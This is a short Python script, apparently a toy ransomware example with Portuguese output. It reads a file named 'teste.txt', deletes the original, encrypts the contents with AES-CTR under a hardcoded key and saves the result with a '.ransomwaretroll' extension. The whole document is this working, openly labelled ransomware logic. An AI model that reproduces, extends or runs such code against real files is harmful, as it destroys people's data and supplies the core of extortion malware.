import os
import pyaes

file_name = 'teste.txt'

with open(file_name, 'rb') as file:
    file_data = file.read()

os.remove(file_name)

key = b'0123456789abcdef0123456789abcdef'

aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + '.ransomwaretroll'

with open(new_file, 'wb') as file:
    file.write(crypto_data)

print(f'Arquivo criptografado como {new_file}')
